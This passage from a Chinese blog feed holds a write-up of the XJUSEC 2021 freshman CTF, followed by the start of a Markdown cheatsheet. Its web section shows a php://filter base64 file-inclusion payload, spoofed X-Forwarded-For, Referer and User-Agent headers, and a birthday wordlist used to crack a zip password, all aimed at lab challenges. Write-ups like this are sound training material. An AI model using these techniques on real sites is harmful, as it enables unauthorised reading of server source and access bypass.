                ><br> 程序首先读入一个长度为21的<code>input</code>字符串,然后将input中的每个字符ASCII码减5,之后在与<code>&quot;SEPN@&gt;vR@G&gt;JH@ZOJZPNx&quot;</code>字符串进行比较,相同则输出<code>lucky!flag is your input</code>,于是编写c++语言脚本如下获得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025010919597.png"
                      alt="image-20211025010919597"
                ></p>
<hr>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><hr>
<h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1.robots"></a>1.robots</h3><p>打开题目链接直接访问robots.txt文件:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011104880.png"
                      alt="image-20211025011104880"
                ><br> 根据robots内内容访问flaaaggg.php拿到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011146021.png"
                      alt="image-20211025011146021"
                ></p>
<h3 id="2-where-is-f1ag"><a href="#2-where-is-f1ag" class="headerlink" title="2.where is f1ag?"></a>2.where is f1ag?</h3><p>打开题目链接发现只有<code>FLAG is not here</code>,F12审查元素看看有没有什么提示:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011328003.png"
                      alt="image-20211025011328003"
                ><br> 发现<code>flag in web.pdf</code>,访问web.pdf在最下面发现flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011432030.png"
                      alt="image-20211025011432030"
                ></p>
<h3 id="3-cookie"><a href="#3-cookie" class="headerlink" title="3.cookie"></a>3.cookie</h3><p>打开链接,根据题目提示直接F12查看cookie:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011532460.png"
                      alt="image-20211025011532460"
                ><br> 发现URL编码过的flag,解码得到<code>XJUSEC&#123;you_find_C00kie!&#125;</code></p>
<h3 id="4-get-post"><a href="#4-get-post" class="headerlink" title="4.get&amp;post"></a>4.get&amp;post</h3><p>打开题目链接发现以下PHP代码:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$a</span> === <span class="string">&#x27;welcome&#x27;</span> &amp;&amp; <span class="variable">$b</span> === <span class="string">&#x27;xju&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Do you know get&amp;post?&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>简单分析可知服务器接收到一个<code>xju=welcome</code>的GET请求和<code>xjusec=xju</code>的POST请求即会执行<code>echo $flag</code>语句,按条件发送后得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025012219767.png"
                      alt="image-20211025012219767"
                ></p>
<h3 id="5-绯红之王"><a href="#5-绯红之王" class="headerlink" title="5.绯红之王"></a>5.绯红之王</h3><p>打开题目链接发现有个名为<code>give me flag</code>访问地址为<code>/flag.php</code>的超级链接,点击后跳转到百度,猜测网页进行了重定向,flag就在flag.php中,于是利用linux下curl命令默认不跟随重定向的特点访问flag.php得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025012627955.png"
                      alt="image-20211025012627955"
                ></p>
<h3 id="6-伪协议"><a href="#6-伪协议" class="headerlink" title="6.伪协议"></a>6.伪协议</h3><p>打开题目链接得到如下代码:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;Happy 1024&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$b</span>);  <span class="comment">//flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>简单分析代码,当<code>file_get_contents($a,&#39;r&#39;)</code>的值等于<code>&quot;Happy 1024&quot;</code>时可以执行<code>include($b)</code>语句,flag在flag.php文件中 首先访问flag.php:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015138723.png"
                      alt="image-20211025015138723"
                ><br> 发现获取不了flag,根据题目提示,该题需要使用伪协议,首先试着访问phpinfo看看可以使用哪些伪协议,发现找不到phpinfo文件(可能是我没找到),于是我先试了试php:&#x2F;&#x2F;input伪协议进行传入<code>&quot;Happy 1024&quot;</code>使file_get_contents($a,’r’)得到的值为<code>Happy 1024</code>,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025014223111.png"
                      alt="image-20211025014223111"
                ><br> 服务器返回<code>Warning: include(): Filename cannot be empty in /var/www/html/index.php</code>错误,意思是include()函数内容不能为空,这就意味着成功执行了<code>include($b)</code>语句,因为没有传b的值而报错. 也说明php:&#x2F;&#x2F;伪协议是可以用的.接下来来传b的值通过伪协议访问flag.php. 这里使用php:&#x2F;&#x2F;filter伪协议中的read,因为要得到<strong>php文件</strong>的源码,我们要对其进行base64编码,即<code>php://filter/read=convert.base64-encode/resource=flag.php</code>得到一串base64编码的字符串:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015702488.png"
                      alt="image-20211025015702488"
                ><br> 对其解码得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015757220.png"
                      alt="image-20211025015757220"
                ></p>
<h3 id="7-Do-you-know-http"><a href="#7-Do-you-know-http" class="headerlink" title="7.Do you know http?"></a>7.Do you know http?</h3><p>打开题目链接得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015902356.png"
                      alt="image-20211025015902356"
                ><br> 于是使用burpsuite发送一个请求方法为<code>Ethe</code>的请求:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020027910.png"
                      alt="image-20211025020027910"
                ><br> 提示”只有本地登陆才可以哦！”,然后加入X-Forwarded-For请求头,值为<code>127.0.0.1</code>:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020244644.png"
                      alt="image-20211025020244644"
                ><br> 又提示”只有从<code>www.xjusec.com</code>过来的人才能看到下一步哦！”,加入Referer请求头,值为<code>www.xjusec.com</code> :<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020511386.png"
                      alt="image-20211025020511386"
                ><br> 又**提示”你为什么不用’xju’这个官方浏览器！！” ,把User-Agent请求头的值改为xju得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020612135.png"
                      alt="image-20211025020612135"
                ><br> 终于拿到了flag!!!!</p>
<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr>
<h3 id="1-Crypto指南"><a href="#1-Crypto指南" class="headerlink" title="1.Crypto指南"></a>1.Crypto指南</h3><p>下载附件CRYPTO.pdf,拉到最下面得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025153716169.png"
                      alt="image-20211025153716169"
                ></p>
<h3 id="2-社会主义核心阿弥陀佛"><a href="#2-社会主义核心阿弥陀佛" class="headerlink" title="2.社会主义核心阿弥陀佛"></a>2.社会主义核心阿弥陀佛</h3><p>下载附件得到一个txt文件,里面内容为:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">诚信自由自由友善平等友善法治敬业友善平等友善爱国公正敬业友善平等诚信民主富强友善爱国诚信平等诚信民主友善公正敬业诚信富强友善爱国公正友善平等文明敬业敬业诚信自由平等友善平等友善法治爱国诚信文明友善爱国平等敬业和谐爱国公正诚信自由爱国爱国富强友善平等公正友善爱国法治友善平等友善法治友善平等富强友善爱国公正敬业敬业友善平等友善自由诚信自由公正爱国和谐诚信民主和谐友善爱国平等敬业富强爱国敬业诚信自由平等敬业和谐爱国公正友善爱国法治诚信富强自由敬业敬业友善爱国公正爱国和谐友善平等和谐友善爱国公正友善自由文明友善平等平等友善爱国公正诚信民主友善公正友善自由友善平等友善爱国平等敬业民主敬业富强友善爱国平等友善自由自由友善平等法治友善爱国公正敬业诚信民主诚信民主富强友善爱国法治敬业诚信富强友善自由自由诚信自由敬业爱国和谐诚信民主友善法治友善爱国爱国诚信富强爱国诚信民主公正诚信自由公正爱国富强诚信富强友善敬业友善爱国平等诚信民主友善爱国敬业法治友善爱国和谐爱国富强爱国文明诚信自由自由友善平等诚信自由爱国自由诚信自由自由友善平等诚信民主友善自由平等友善爱国公正爱国富强友善自由诚信平等友善爱国公正爱国富强敬业公正友善爱国自由诚信民主诚信平等诚信民主民主诚信自由公正敬业敬业友善平等诚信富强友善爱国公正爱国敬业爱国富强诚信自由平等爱国公正诚信富强平等诚信自由平等爱国诚信民主敬业诚信和谐友善爱国自由诚信民主友善爱国爱国自由友善爱国平等友善自由诚信平等诚信富强友善平等友善爱国公正爱国富强诚信富强诚信平等诚信自由公正敬业民主友善自由敬业友善爱国法治友善自由平等敬业诚信自由诚信自由自由友善平等诚信平等诚信民主民主诚信自由平等敬业文明敬业文明友善爱国法治敬业友善自由诚信富强自由友善爱国公正诚信民主诚信文明诚信富强友善平等诚信自由公正友善平等和谐友善自由文明友善爱国法治爱国自由友善自由民主诚信自由平等诚信富强自由诚信富强法治友善爱国公正爱国和谐诚信民主和谐诚信自由公正敬业平等友善平等爱国友善爱国公正友善平等公正爱国平等诚信自由平等敬业民主敬业富强友善爱国敬业爱国文明友善自由和谐友善爱国法治友善自由友善平等敬业诚信平等诚信自由公正诚信富强文明诚信民主平等诚信自由自由友善平等诚信民主诚信富强平等诚信自由爱国爱国爱国友善自由友善公正诚信自由平等诚信民主爱国敬业诚信和谐诚信自由法治诚信民主友善法治诚信民主富强诚信自由爱国敬业爱国爱国法治友善爱国公正友善自由友善法治友善平等友善平等诚信自由公正友善自由文明诚信民主平等诚信自由法治友善平等友善爱国友善自由友善敬业友善爱国法治友善平等诚信和谐友善平等富强友善爱国敬业爱国公正诚信富强诚信平等友善爱国平等敬业民主敬业富强诚信自由自由诚信民主诚信自由敬业友善法治诚信自由法治友善平等诚信和谐诚信民主富强诚信自由平等爱国友善敬业爱国和谐诚信自由平等诚信富强平等友善自由文明诚信自由法治友善自由平等敬业友善爱国友善爱国平等友善平等诚信自由敬业法治诚信自由爱国友善自由爱国友善平等公正诚信自由公正爱国富强友善自由诚信平等诚信自由敬业敬业敬业诚信富强自由诚信自由平等友善自由平等诚信富强文明诚信自由平等友善自由敬业爱国公正友善爱国平等友善自由诚信自由诚信富强自由 </span><br></pre></td></tr></table></figure></div>

<p>以前在网上瞎看的时候看到一个”核心价值观编码”,于是拿上去解码得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154235376.png"
                      alt="image-20211025154235376"
                ><br> 根据题目提示和密文格式,判断是”与佛论禅”,拿上去解码得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154329740.png"
                      alt="image-20211025154329740"
                ></p>
<h3 id="3-爱弹贝斯的Caesar"><a href="#3-爱弹贝斯的Caesar" class="headerlink" title="3.爱弹贝斯的Caesar"></a>3.爱弹贝斯的Caesar</h3><p>下载附件得到一个txt文件,内容为<code>S1dIRlJQezd1cl8yYWZqUmVfMWZfdW5lcV82Yl9ndTFheF8wNX0=</code> 根据题目”贝斯”和密文内容,猜测为base64编码,解码得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154542804.png"
                      alt="image-20211025154542804"
                ><br> 发现又为一串密文,观察格式判断可能为凯撒密码,用工具枚举得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154725298.png"
                      alt="image-20211025154725298"
                ></p>
<h3 id="4-小羊跳栅栏"><a href="#4-小羊跳栅栏" class="headerlink" title="4.小羊跳栅栏"></a>4.小羊跳栅栏</h3><p>题目密文为:<code>XXJJUUSCETCF&#123;_WhEaLVCe0_MgEo_0TdO__T1i0m2e4&#125;</code>,根据题目提示猜测为栅栏密码, 用工具枚举到22得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154922737.png"
                      alt="image-20211025154922737"
                ></p>
<h3 id="5-d-￣▽￣-b"><a href="#5-d-￣▽￣-b" class="headerlink" title="5.d=(￣▽￣*)b"></a>5.d=(￣▽￣*)b</h3><p>下载附件,得到一个名为txt的文件.用notepad++打开的:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025155246508.png"
                      alt="image-20211025155246508"
                ><br> 发现是一堆符号组成的表情,我先到网上搜索表情密码,但是没有获得有效信息,后来不断搜索得知这种东西叫颜文字(知道这东西但用的不多,一时半会没想起来),于是又在网上搜了颜文字密码(aaencode),解密得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025155813049.png"
                      alt="image-20211025155813049"
                ></p>
<h3 id="6-ROT全家桶"><a href="#6-ROT全家桶" class="headerlink" title="6.ROT全家桶"></a>6.ROT全家桶</h3><p>题目给出<code>z(wu#!LH9780h07eK4JC047;BN</code>这一串密文,根据题目提示,应该是ROT系列加密,而且不止一种,于是用工具进行解密: 首先我用ROT47解密得到<code>KWHFRP&#123;whfg_9_f6zcyr_cfjq&#125;</code>,以为接下来是凯撒密码,于是我拿去枚举,得到:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025160418568.png"
                      alt="image-20211025160418568"
                ><br> 将其填入flag,提示错误(黑人问号脸???), 然后仔细看了看我得到的这个flag,发现不能连成一句话,又想想题目,觉得应该不止一次ROT加密,于是又把上一步得到的字符串拿去ROT解密,接下来用ROT18解密试试:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025160737367.png"
                      alt="image-20211025160737367"
                ><br> 得到应该神似flag的字符串,拿去试试,成功</p>
<h3 id="7-我emo了"><a href="#7-我emo了" class="headerlink" title="7.我emo了"></a>7.我emo了</h3><p>下载附件得emo.txt, 里面内容为<code>👏👁👌👊🐼🐺👲👜👤👦👖👦👥👣👰👖👫👟👩👜👜👖👛👜👚👦👛👠👥👞👖👤👜👫👟👦👛👪👴</code>,根据题目和文件名提示,猜测是一个与emoji有关的密码,去网上搜索,得到相关解密网站,解密得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161103301.png"
                      alt="image-20211025161103301"
                ></p>
<h3 id="8-calendar"><a href="#8-calendar" class="headerlink" title="8.calendar"></a>8.calendar</h3><p>下载附件得到一串字符串 <code>S21 F1 T12 T11 T22 M1 F1 M3</code>,根据题目提示,在网上搜索日历密码,发现以下解密方法:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161803100.png"
                      alt="image-20211025161803100"
                ><br> 于是根据题中所给hint手动解密(失败好几次)得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161849524.png"
                      alt="image-20211025161849524"
                ></p>
<h3 id="9-给我的宝剑附个魔"><a href="#9-给我的宝剑附个魔" class="headerlink" title="9.给我的宝剑附个魔"></a>9.给我的宝剑附个魔</h3><p>下载附件解压为一张图片:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161958159.png"
                      alt="image-20211025161958159"
                ><br> 开始想的是图片隐写(中间写图片隐写写迷了),好久后才发现这是道密码题,在网上搜索跟我的世界附魔方面有关的密码发现有个叫”标准银河字母”的东西:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025162329783.png"
                      alt="image-20211025162329783"
                ><br> 然后对照得到3串字符串,刚开始不知道哪一部分是flag,交了好几个也都错了,想了一会决定拿最后一句赌一把,最后一串大致为<code>flag is standard galaxy word</code>,于是拿<code>standard galaxy word</code>转大写包上XJUSEC{}交了,成功.</p>
<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><hr>
<h3 id="1-你是为网络安全而生的"><a href="#1-你是为网络安全而生的" class="headerlink" title="1.你是为网络安全而生的"></a>1.你是为网络安全而生的</h3><p>关注公众号即可得到flag</p>
<h3 id="2-眼见为虚"><a href="#2-眼见为虚" class="headerlink" title="2.眼见为虚"></a>2.眼见为虚</h3><p>下载附件得到一个压缩包,解压,又得到一个压缩包,再解压,得到一个flag.txt,打开即可得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025203118107.png"
                      alt="image-20211025203118107"
                ></p>
<h3 id="3-签退"><a href="#3-签退" class="headerlink" title="3.签退"></a>3.签退</h3><p>打开题目所给网址填完问卷即可得到flag</p>
<h3 id="4-谁会拒绝嘉然呢？"><a href="#4-谁会拒绝嘉然呢？" class="headerlink" title="4.谁会拒绝嘉然呢？"></a>4.谁会拒绝嘉然呢？</h3><p>下载文件名为zip的附件,根据文件名猜测是个zip压缩包,解压得到”谁会拒绝嘉然呢”文件夹:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025203540591.png"
                      alt="image-20211025203540591"
                ><br> 运行exe文件发现是个拼图游戏,根据题目以及里面图片的提示决定直接拼,将图片一张一张往word里拖慢慢拼,最后可以得到flag(当时没有保存实在是不想再拼一遍了)</p>
<h3 id="5-你画我猜"><a href="#5-你画我猜" class="headerlink" title="5.你画我猜"></a>5.你画我猜</h3><p>下载文件解压,得到一个mrf结尾的文件,经过反复搜索确认(搜了好久),确定是个记录鼠标轨迹的文件,可以用相应的软件(下了好多软件,最终确认是MouseRecorder)打开复现鼠标轨迹:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204022521.png"
                      alt="image-20211025204022521"
                ><br> 准备打开画图复现轨迹,但是软件总是报错,最后将Window change这一项删掉后就可以正常复现了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225922662.png"
                      alt="image-20211025225922662"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204600748.png"
                      alt="image-20211025204600748"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204451999.png"
                      alt="image-20211025204451999"
                ></p>
<h3 id="6-你究竟会不会看图片啊？"><a href="#6-你究竟会不会看图片啊？" class="headerlink" title="6.你究竟会不会看图片啊？"></a>6.你究竟会不会看图片啊？</h3><p>下载题目附件解压得到一个有密码的压缩包和一个二维码:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205053058.png"
                      alt="image-20211025205053058"
                ><br> 扫描二维码得到一句”Do you know when Shanny’s birthday is”,得到关键信息-解压密码有可能是一个生日. 于是用c语言写了一个字典:</p>
 <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span> </span></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="built_in">freopen</span>(<span class="string">&quot;bar.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout); </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">01</span>;j&lt;=<span class="number">12</span>;j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">31</span>;k++)&#123; </span><br><span class="line">      <span class="keyword">if</span>(j/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;j&lt;&lt;<span class="string">&quot;&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span>(k/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;k&lt;&lt;endl; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025230317616.png"
                      alt="image-20211025230317616"
                ><br> 然后用github上的zipcrack跑密码,得到密码为0308:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025230549981.png"
                      alt="image-20211025230549981"
                ><br> 输入密码解压得到两张图片猜测是图片隐写 用01editor打开,在第一张图片里发现<code>XJUSEC&#123;Y0u_h2ve_a1r2ady_XJUSEC&#123;w0w j1ng rucb5439345d8b014396&#125;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205858897.png"
                      alt="image-20211025205858897"
                ><br> 第二张里发现flag:<code>a1r2ady_sta1ted&#125;</code>:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205956732.png"
                      alt="image-20211025205956732"
                ><br> 拼接得到flag: <code>XJUSEC&#123;Y0u_h2ve_a1r2ady_sta1ted&#125;</code></p>
<h3 id="7-暗藏玄机的excel"><a href="#7-暗藏玄机的excel" class="headerlink" title="7.暗藏玄机的excel"></a>7.暗藏玄机的excel</h3><p>下载附件flag.xlsx,打开查看里面内容,发现几条重要信息:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211438283.png"
                      alt="image-20211025211438283"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211507228.png"
                      alt="image-20211025211507228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211614649.png"
                      alt="image-20211025211614649"
                ><br> 根据最后一个提示,我用01editor打开这个文件发现文件头为<code>50 4B 03 04</code>判断是个zip压缩包:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211756918.png"
                      alt="image-20211025211756918"
                ><br> 解压得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211958198.png"
                      alt="image-20211025211958198"
                ><br> 里面有很多文件,找了一会后发现几个信息:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025212701885.png"
                      alt="image-20211025212701885"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025212346719.png"
                      alt="image-20211025212346719"
                ><br> 后来觉得开始excel里给的几个提示也许有用,一个是”表一少了什么,有什么东西看不见”,一个是”你不觉得表一中的嘉然很可爱吗”,觉得可能flag藏在这两个地方相关的文件里,于是notepad++打开几个相关的文件,发现了一些信息,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213252838.png"
                      alt="image-20211025213252838"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213302291.png"
                      alt="image-20211025213302291"
                ><br> 从这两个信息判断出这个图片一个隐藏了一个加密的zip的压缩包,把图片送进01editor搜索zip文件头<code>50 4B 03 04</code>文件头,发现:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213500288.png"
                      alt="image-20211025213500288"
                ><br> 文件尾刚好也是<code>00 00 00 00</code>,确定是个zip压缩包,将<code>50 4B 03 04</code>及以下16进制代码另存为一个fffflag.zip:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213719297.png"
                      alt="image-20211025213719297"
                ><br> 解压,密码在上面已获得,得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213848528.png"
                      alt="image-20211025213848528"
                ></p>
<hr>
<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><hr>
<h3 id="1-找找flag"><a href="#1-找找flag" class="headerlink" title="1.找找flag?"></a>1.找找flag?</h3><p>根据题目提示访问Github搜索Ethe448,发现有一个hexo博客的项目,仔细看了看发现有个Secret(题目中的”小秘密”),打开得到两张图片:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213925365.png"
                      alt="image-20211025213925365"
                ><br> 拼接二维码扫描得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214136400.png"
                      alt="image-20211025214136400"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214232394.png"
                      alt="image-20211025214232394"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>2021</tag>
        <tag>Crypto</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Osint</tag>
        <tag>Pwn</tag>
        <tag>Reverse</tag>
        <tag>Web</tag>
        <tag>XJUSEC</tag>
        <tag>XJU新生赛</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>MarkDown语法</title>
    <url>/2021/09/25/MarkDown%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="Markdown-Cheatsheet"><a href="#Markdown-Cheatsheet" class="headerlink" title="Markdown Cheatsheet"></a>Markdown Cheatsheet<a name="TOP"></a></h1><hr>
<h1 id="Heading-1"><a href="#Heading-1" class="headerlink" title="Heading 1"></a>Heading 1</h1><pre><code>Markup :  # Heading 1 #

-OR-

Markup :  ============= (below H1 text)
</code></pre>
<h2 id="Heading-2"><a href="#Heading-2" class="headerlink" title="Heading 2"></a>Heading 2</h2><pre><code>Markup :  ## Heading 2 ##

-OR-

Markup: --------------- (below H2 text)
</code></pre>
<h3 id="Heading-3"><a href="#Heading-3" class="headerlink" title="Heading 3"></a>Heading 3</h3><pre><code>Markup :  ### Heading 3 ###
</code></pre>
<h4 id="Heading-4"><a href="#Heading-4" class="headerlink" title="Heading 4"></a>Heading 4</h4><pre><code>Markup :  #### Heading 4 ####
</code></pre>
<p>Common text</p>
<pre><code>Markup :  Common text
</code></pre>
<p><em>Emphasized text</em></p>
<pre><code>Markup :  _Emphasized text_ or *Emphasized text*
</code></pre>
<p><del>Strikethrough text</del></p>
<pre><code>Markup :  ~~Strikethrough text~~
</code></pre>
<p><strong>Strong text</strong></p>
<pre><code>Markup :  __Strong text__ or **Strong text**
</code></pre>
<p><em><strong>Strong emphasized text</strong></em></p>
<pre><code>Markup :  ___Strong emphasized text___ or ***Strong emphasized text***
</code></pre>
